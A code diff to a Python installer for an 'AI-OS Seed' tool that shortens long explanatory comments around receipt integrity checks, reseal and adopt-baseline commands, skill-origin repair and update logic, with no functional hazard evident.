-    property; it is one the operator learns to ignore.
-
-    So the way back exists, but it is deliberately loud: it prints every
-    measured path that differs from the receipt's own shipped snapshot, says
-    plainly that it is accepting them, and needs a typed yes. It never
-    fetches, never writes shipped bytes, and changes exactly one field.
+    installed_sha is otherwise refreshed only by install and update, so an
+    install that diverges for a good reason would stay red forever. This is
+    the explicit way back: it lists every shipped file that differs, needs a
+    typed yes, and changes exactly one field.
     """
     receipt = _load_receipt(target)
     if receipt is None:
@@ -4096,10 +3344,7 @@ def do_reseal(target: Path, assume_yes: bool) -> int:
     changed, gone = [], []
     for rel, rec in sorted(shipped.items()):
         want = (rec or {}).get("hash") or ""
-        # Only FILES carry a content hash. A dir or symlink entry has none,
-        # and calling those "MISSING" made the first draft of this list name
-        # every shipped skill directory — noise in exactly the list an
-        # operator is being asked to read before accepting.
+        # Only files carry a content hash; skip dir/symlink entries.
         if not want.startswith("sha256:"):
             continue
         p = target / rel
@@ -4142,25 +3387,12 @@ def do_reseal(target: Path, assume_yes: bool) -> int:
 
 
 def do_adopt_baseline(target: Path) -> int:
-    """SEED-076 follow-up, found live the first time --update ran against a
-    REAL install: some installs predate the receipt system itself (pre-
-    Wave-2H — no .cc-seed/receipt.json at all), a state even older than the
-    "legacy install with a receipt but no shipped history" case --update
-    already handles by fetching the historical commit. There is no commit
-    to fetch here — nothing on disk records what was ever "shipped" versus
-    added later by the operator.
+    """Record the current tree as the operator-approved baseline for an
+    install that predates receipts entirely (no history to fetch).
 
-    The panel's explicit recommendation for exactly this case (2026-08-15
-    design review, gpt-5.6-terra): "offer an explicit, noisy --adopt-
-    baseline/migration workflow that records current hashes as the
-    operator-approved baseline; it must not be implicit in --update." This
-    is that command. It does NOT claim anything about where the current
-    content came from — it just says "starting now, treat exactly this as
-    the known-good reference point," which is the only honest thing this
-    tool can say about a tree with no history. Requires the operator to
-    run it by name; --update never calls it implicitly, and it refuses on
-    a target that already has a receipt (that's --update's job, not this
-    one's)."""
+    Makes no claim about where the content came from. Run only by name —
+    --update never calls it — and refuses a target that already has a
+    receipt."""
     if not looks_like_install(target):
         return die(f"{target} doesn't look like an AI-OS Seed install — "
                    f"--adopt-baseline only operates on an existing install")
@@ -4172,21 +3404,7 @@ def do_adopt_baseline(target: Path) -> int:
     present = [c for c in SHIPPED_PATHS if (target / c).exists()]
     shipped = _shipped_snapshot(target, present)
     receipt = {
-        # 2 (2026-09-19, SEED-080 bug bash). What changed:
-        #   install.refused_skills[]        — a skill the origin rule REFUSED
-        #   gated_writes.memory-hooks.entries        — now ONLY what was added
-        #   gated_writes.memory-hooks.already_present — what was already wired
-        #   gated_writes.memory-hooks.adopted        — wired before we arrived
-        #   gated_writes.memory-hooks.prior_bytes_len — replaces prior_bytes,
-        #       which copied the user's whole settings.json (API key and all)
-        #       into the receipt AND the out-of-target anchor
-        #   install.package_sha              — the dist the install came from
-        # Nothing READS `schema`, and every reader of the fields above uses
-        # .get() with a default, so a schema-1 receipt keeps working: a
-        # missing refused_skills is no refusals, a missing prior_bytes_len is
-        # simply not reported, and prior_bytes on an old receipt is left alone
-        # rather than rewritten (an uninstall removes it with the receipt).
-        # Migration note: docs/install-audit.md.
+        # Same schema as _init_receipt.
         "schema": 2,
         "install": {
             "target": str(target), "mode": "adopted",
@@ -4209,17 +3427,9 @@ def do_adopt_baseline(target: Path) -> int:
 
 
 def _redecide_skill_origins(target: Path, receipt: dict) -> int:
-    """Re-ask the ORIGIN question for every shipped skill that is not already
-    correctly registered, and reconcile the receipt. Returns how many were
-    newly registered.
-
-    This is the repair path for a REFUSED skill. Until 2026-09-19 there wasn't
-    one: the refusal left no link and no record, and `--update` returned early
-    on "already current (version X) — nothing to do" (and again on "nothing to
-    apply"), so removing the colliding user-scope file and re-running --update
-    --apply exited 0 and still registered nothing (2026-09-19 review, finding
-    5, executed as refused_skill_retry). "No files to write" is not "nothing to
-    do"."""
+    """Re-run the origin check for every shipped skill not already correctly
+    registered, and reconcile the receipt. Returns how many were newly
+    registered. This is the repair path for a refused skill."""
     registered, deferred, refused, seen = _register_new_skills(target)
     _merge_deferred(receipt, deferred)
     _merge_refused(receipt, refused, seen)
@@ -4259,23 +3469,16 @@ def do_update(target: Path, from_arg: str, apply: bool, allow_downgrade: bool) -
                 return die(f"update: fetched version {new_version!r} is OLDER than the "
                           f"installed {current_version!r} — refusing (pass --allow-downgrade "
                           f"if this is deliberate, e.g. --from a specific local clone)")
-            # A version string is not an identity for a BETA: every build
-            # between version bumps says the same thing, so "already current"
-            # silently refused to install any of them (the beta channel,
-            # 2026-09-26). Same version is "current" only when the package
-            # bytes are the ones this install came from, too.
+            # A version string doesn't identify a beta build; "current" also
+            # requires the package bytes to match.
             same_bytes = (receipt["install"].get("package_sha")
                           == _package_sha(new_tree))
             if new_version != "unknown" and new_version == current_version and same_bytes:
                 print(f"update: already current (version {current_version}).")
                 if apply:
                     _redecide_skill_origins(target, receipt)
-                    # Same-version is still the moment to repair the two things
-                    # an old installer could not give this tree: its baseline
-                    # measurement and the installer itself. Without this, an
-                    # install that is already current is UNREPAIRABLE — there
-                    # is no other verb, and "already current" returns before
-                    # any plan is computed (found on {{REDACTED}}, 2026-09-19).
+                    # Still repair what an old installer couldn't provide: the
+                    # baseline measurement and the installer itself.
                     changed = _refresh_installer(target, new_tree)
                     if not receipt["install"].get("installed_sha"):
                         _record_installed_sha(target, receipt)
@@ -4333,26 +3536,13 @@ def do_update(target: Path, from_arg: str, apply: bool, allow_downgrade: bool) -
                 print("\n(dry run — pass --apply to write these changes)")
                 return 0
             if not plan["create"] and not plan["update"]:
-                # No FILES to write is not the same as nothing to DO. A skill
-                # refused at install (a different user-scope twin) leaves no
-                # link, and the only way to repair it is to re-ask the origin
-                # question — which used to be unreachable, because the same
-                # version had nothing to apply and this branch returned first.
-                # Remove the collision, re-run --update --apply, exit 0, still
-                # no link (2026-09-19 review, finding 5, executed as
-                # refused_skill_retry). The origin question is re-asked here.
+                # No files to write is not nothing to do: re-run the skill
+                # origin check (repairs refused skills).
                 if bootstrapped:
                     receipt["shipped"] = shipped_now
-                # An install that is ALREADY current still needs a baseline.
-                # installed_sha was only ever recorded on a non-empty apply, so
-                # a tree that reached the current version before R2 shipped
-                # could never obtain one: M0-package-integrity failed forever
-                # ("the receipt does not say what this install wrote"), with no
-                # verb that could fix it. An empty plan means the shipped bytes
-                # MATCHED the fetched tree, which is precisely a verified-clean
-                # moment, so recording here is sound. Only when ABSENT — this
-                # must never re-baseline a tree that already has one, which is
-                # the tamper-laundering path the R2 comment below guards.
+                # An empty plan means shipped bytes match the fetched tree, so
+                # record a baseline if one is absent. Never re-baseline an
+                # existing one.
                 sha_recorded = False
                 if not receipt["install"].get("installed_sha"):
                     _record_installed_sha(target, receipt)
@@ -4375,18 +3565,10 @@ def do_update(target: Path, from_arg: str, apply: bool, allow_downgrade: bool) -
                 _register_new_skills(target)
             _merge_deferred(receipt, newly_deferred)
             _merge_refused(receipt, newly_refused, seen_names)
-            # SEED-080 (the SEED-076 receipt-audit bug): --update refreshed
-            # receipt["shipped"] but never extended install.components or
-            # install.registered_skills — and _check_1 enumerates from exactly
-            # those two fields. A component that arrived by update was
-            # therefore never audited: not compared against the package, and
-            # (worse) reported as an unexpected path by the sweep at the end.
-            # Silent, and it got quieter the more the seed grew.
+            # Extend install.components and registered_skills so check 1 audits
+            # what arrived by update.
             comps = receipt["install"].setdefault("components", [])
-            # "unchanged" counts too: a component that reached the tree some
-            # other way (an older installer, a hand repair) but whose bytes
-            # ARE the package's is shipped here — leaving it out of
-            # components kept session-brief/ reported as UNEXPECTED forever.
+            # "unchanged" counts too: those bytes are the package's.
             for rel in sorted(set(plan["create"]) | set(plan["update"]) | set(plan["unchanged"])):
                 top = rel.split("/", 1)[0]
                 if top in COMPONENTS and top not in comps:
@@ -4403,15 +3585,11 @@ def do_update(target: Path, from_arg: str, apply: bool, allow_downgrade: bool) -
             })
             receipt["updates"] = updates
             receipt["install"]["installer_version"] = new_version
-            # The receipt must name the dist this tree now came FROM, or a beta
-            # soak (tools/soak_evidence.py) could never bind to what was tested:
-            # package_sha used to stay the ORIGINAL install's forever.
+            # Name the dist this tree now came from (soak evidence binds to it).
             receipt["install"]["package_sha"] = _package_sha(new_tree)
             updates[-1]["package_sha"] = receipt["install"]["package_sha"]
-            # R2: an update legitimately rewrites shipped bytes, so the
-            # measurement is retaken here. Only install and update refresh it —
-            # an --audit or --approve run must never re-baseline a tampered
-            # tree, which is the whole point of recording it.
+            # An update legitimately rewrites shipped bytes, so re-measure.
+            # Only install and update refresh this; --audit/--approve never do.
             _record_installed_sha(target, receipt)
             _refresh_installer(target, new_tree)
             _save_receipt(target, receipt)
@@ -4561,14 +3739,7 @@ def main():
     args = ap.parse_args()
 
     if args.detect:
-        # Enumerated from the PARSER, not from a hand-maintained list of
-        # flags. The hand-maintained one silently stopped covering new
-        # operations: `--detect --revoke memory-hooks --apply`,
-        # `--detect --contract` and `--detect --update` all returned 0 having
-        # run only the survey, never the operation the caller asked for
-        # (2026-09-19 review, finding 14, executed as
-        # parse_ignored_operation). Anything a future wave adds is covered on
-        # the day it is added.
+        # Enumerated from the parser, so any new flag is rejected too.
         DETECT_COMPATIBLE = {"detect", "from_pack", "verbose"}
         defaults = ap.parse_args([])
         combined = sorted(
